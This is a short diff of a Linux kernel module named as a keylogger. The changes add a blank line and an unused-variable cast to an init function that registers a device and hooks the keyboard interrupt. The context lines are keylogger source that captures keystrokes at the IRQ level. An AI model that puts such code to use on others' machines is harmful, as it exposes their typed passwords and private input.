@@ -8,6 +8,7 @@ MODULE_DESCRIPTION("Module keylog");
 
 t_keylst	*k_lst = NULL;
 int		read_done = 0;
+
 /*
 void		display_list_element(t_keylst *node, char *buffer, loff_t **offset, size_t len)
 {
@@ -121,6 +122,7 @@ static int		__init keylogger_init(void)
 {
 	if (misc_register(&key_dev))
 		return 1;
+	(void)keyboard_name;
 	if (request_irq(KBD_IRQ, kbd_irq_handler, IRQF_SHARED, "keylogger", (void *)kbd_irq_handler))
 	{
 		printk(KERN_INFO "something went wrong in request_irq\n");
